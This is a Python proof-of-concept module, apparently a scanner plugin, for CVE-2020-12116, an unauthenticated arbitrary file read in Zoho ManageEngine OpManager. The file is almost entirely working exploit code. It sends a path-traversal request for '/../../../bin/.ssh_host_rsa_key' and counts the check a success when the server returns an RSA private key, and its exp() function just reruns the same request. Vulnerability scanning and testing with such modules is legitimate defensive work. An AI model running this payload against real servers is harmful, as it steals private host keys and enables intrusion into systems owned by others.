import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Unauthenticated Zoho ManageEngine OpManger Arbitrary File Read''',
        "description": '''Zoho ManageEngine OpManager Stable build before 124196 and Released build before 125125 allows an unauthenticated attacker to read arbitrary files on the server by sending a crafted request.''',
        "severity": "high",
        "references": [
            "https://github.com/BeetleChunks/CVE-2020-12116"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-12116",
            "cwe-id": "CWE-22"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "zoho", "lfi", "manageengine"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/../../../bin/.ssh_host_rsa_key"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*', 'Cache-Control': 'max-age=0', 'Connection': 'close', 'Referer': 'http://{{Hostname}}'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200 and "BEGIN RSA PRIVATE KEY" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url